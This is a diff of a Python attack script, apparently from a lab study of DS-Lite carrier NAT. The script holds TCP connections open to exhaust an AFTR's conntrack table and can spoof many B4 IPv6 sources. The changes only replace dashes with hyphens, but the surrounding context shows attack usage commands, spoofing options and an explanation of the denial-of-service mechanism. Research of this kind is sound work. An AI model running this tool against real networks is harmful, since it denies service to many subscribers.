@@ -1,13 +1,13 @@
 #!/usr/bin/python
-# T1-HOLD – TCP ESTABLISHED Connection Hold Attack
+# T1-HOLD - TCP ESTABLISHED Connection Hold Attack
 #
 # Two modes:
 #
-#   LAN (default) – attacker is behind a B4 on an IPv4 subnet.
+#   LAN (default) - attacker is behind a B4 on an IPv4 subnet.
 #     Uses asyncio OS-level TCP connections.  Works because the OS has IPv4
 #     routes through the B4 gateway.
 #
-#   ISP tunnel (--tunnel) – attacker is on the IPv6 ISP network.
+#   ISP tunnel (--tunnel) - attacker is on the IPv6 ISP network.
 #     Uses raw AF_PACKET sockets + a minimal TCP state machine.
 #     Builds 4-in-6 (IPv4-in-IPv6) packets directly, bypassing the OS TCP stack.
 #     A dedicated receiver thread sniffs incoming SYN-ACKs from the AFTR;
@@ -32,7 +32,7 @@
 # LAN (IPv4, original mode):
 #   python3 nat_hold.py --target 198.51.100.2 --port 6666 --conns 200
 #
-# ISP tunnel – single B4 identity (real attacker IPv6):
+# ISP tunnel - single B4 identity (real attacker IPv6):
 #   python3 nat_hold.py --tunnel \
 #       --interface eth-isp \
 #       --src-ip6 2001:db8:cafe::200 \
@@ -40,7 +40,7 @@
 #       --inner-src-prefix 10.0.0.0/16 \
 #       --target 198.51.100.2 --port 6666 --conns 200
 #
-# ISP tunnel – spoof many B4s (maximise conntrack diversity):
+# ISP tunnel - spoof many B4s (maximise conntrack diversity):
 #   python3 nat_hold.py --tunnel \
 #       --interface eth-isp \
 #       --src-ip6-prefix 2001:db8:cafe::/48 \
@@ -485,7 +485,7 @@ def worker_tunnel(args, dmac: str, thread_id: int, num_slots: int):
                             except OSError:
                                 pass
 
-            time.sleep(0.05)   # 50 ms poll — light enough for hundreds of slots
+            time.sleep(0.05)   # 50 ms poll - light enough for hundreds of slots
 
     finally:
         # Deregister all queues for this thread's slots
@@ -536,7 +536,7 @@ def progress_printer(args):
 def main():
     p = argparse.ArgumentParser(
         description=(
-            'T1-HOLD – TCP Connection Hold Attack\n'
+            'T1-HOLD - TCP Connection Hold Attack\n'
             'Holds TCP connections open to fill AFTR conntrack with ESTABLISHED\n'
             'entries (timeout 432000 s).  Two modes:\n'
             '  LAN    : asyncio OS-level TCP (attacker behind a B4, IPv4 reachable)\n'
@@ -547,13 +547,13 @@ def main():
 LAN mode (attacker on B4-1 LAN, 10.0.1.150):
   python3 nat_hold.py --target 198.51.100.2 --port 6666 --conns 200
 
-ISP tunnel mode – single B4 identity:
+ISP tunnel mode - single B4 identity:
   python3 nat_hold.py --tunnel --interface eth-isp \\
       --src-ip6 2001:db8:cafe::200 --aftr-ip6 2001:db8:cafe::10 \\
       --inner-src-prefix 10.0.0.0/16 \\
       --target 198.51.100.2 --port 6666 --conns 200 --threads 4
 
-ISP tunnel mode – spoof many B4s:
+ISP tunnel mode - spoof many B4s:
   python3 nat_hold.py --tunnel --interface eth-isp \\
       --src-ip6-prefix 2001:db8:cafe::/48 --aftr-ip6 2001:db8:cafe::10 \\
       --inner-src-prefix 10.0.0.0/16 \\
@@ -595,14 +595,14 @@ Monitor AFTR conntrack (run in AFTR netns):
                      help='Attacker outer IPv6 src (fixed B4 identity)')
     tun.add_argument('--src-ip6-prefix',
                      help='Randomise outer IPv6 src from this prefix '
-                          '(e.g. 2001:db8:cafe::/48) – spoofs many B4s')
+                          '(e.g. 2001:db8:cafe::/48) - spoofs many B4s')
     tun.add_argument('--aftr-ip6', default='2001:db8:cafe::10',
                      help='AFTR IPv6 address (default: 2001:db8:cafe::10)')
     tun.add_argument('--inner-src-ip4', default='10.0.1.50',
                      help='Fixed inner IPv4 src for tunnel slots (default: 10.0.1.50)')
     tun.add_argument('--inner-src-prefix',
                      help='Randomise inner IPv4 src from this CIDR '
-                          '(e.g. 10.0.0.0/16) – increases conntrack 5-tuple diversity')
+                          '(e.g. 10.0.0.0/16) - increases conntrack 5-tuple diversity')
     tun.add_argument('--threads', type=int, default=4,
                      help='Worker threads in tunnel mode (default: 4)')
     tun.add_argument('--dmac',
@@ -644,12 +644,12 @@ Monitor AFTR conntrack (run in AFTR netns):
             print(f"[*] Resolving NDP for AFTR {args.aftr_ip6} …")
             dmac = _resolve_mac_ndp(args.interface, args.aftr_ip6)
             if not dmac:
-                print("[!] NDP failed – using multicast fallback 33:33:00:00:00:10")
+                print("[!] NDP failed - using multicast fallback 33:33:00:00:00:10")
                 dmac = "33:33:00:00:00:10"
             print(f"[*] AFTR MAC: {dmac}")
 
         print(f"{BOLD}╔══════════════════════════════════════════════════════════════╗{NC}")
-        print(f"{BOLD}║   T1-HOLD (ISP Tunnel) – 4-in-6 TCP ESTABLISHED Hold         ║{NC}")
+        print(f"{BOLD}║   T1-HOLD (ISP Tunnel) - 4-in-6 TCP ESTABLISHED Hold         ║{NC}")
         print(f"{BOLD}╚══════════════════════════════════════════════════════════════╝{NC}")
         print(f"  Interface : {args.interface}")
         print(f"  Target    : {args.target}:{args.port}")
@@ -743,7 +743,7 @@ Monitor AFTR conntrack (run in AFTR netns):
             recv_t.join(timeout=2)
         finally:
             # ALWAYS remove the temporarily added IPv6 addresses, even on
-            # SIGTERM/exception — otherwise a forged ::b4N/128 leaks onto the
+            # SIGTERM/exception - otherwise a forged ::b4N/128 leaks onto the
             # attacker interface and corrupts later runs. (SIGKILL still can't be
             # caught; the lab's ensure_attacker_isp strips any straggler.)
             for addr in _added_ipv6:
@@ -765,7 +765,7 @@ Monitor AFTR conntrack (run in AFTR netns):
 
     # ── LAN mode entry ────────────────────────────────────────────────────────
     print(f"{BOLD}╔══════════════════════════════════════════════════════════════╗{NC}")
-    print(f"{BOLD}║   T1-HOLD – TCP Connection Hold Attack                       ║{NC}")
+    print(f"{BOLD}║   T1-HOLD - TCP Connection Hold Attack                       ║{NC}")
     print(f"{BOLD}╚══════════════════════════════════════════════════════════════╝{NC}")
     print(f"  Target    : {args.target}:{args.port}")
     print(f"  Hold conns: {args.conns}  (ramp-up: {args.rampup}/s)")
@@ -776,7 +776,7 @@ Monitor AFTR conntrack (run in AFTR netns):
     print(f"  {YELLOW}[!] How it works:{NC}")
     print(f"      Connect → receive server response → keep write-side open")
     print(f"      nc is stuck in CLOSE_WAIT → cannot serve new clients")
-    print(f"      AFTR conntrack: ESTABLISHED/CLOSE_WAIT entries (240–8640s, GC-hard)")
+    print(f"      AFTR conntrack: ESTABLISHED/CLOSE_WAIT entries (240-8640s, GC-hard)")
     print()
     print("  [!] Monitor AFTR:")
     print("        watch -n1 'conntrack -C; conntrack -L -p tcp 2>/dev/null | grep -c CLOSE_WAIT'")
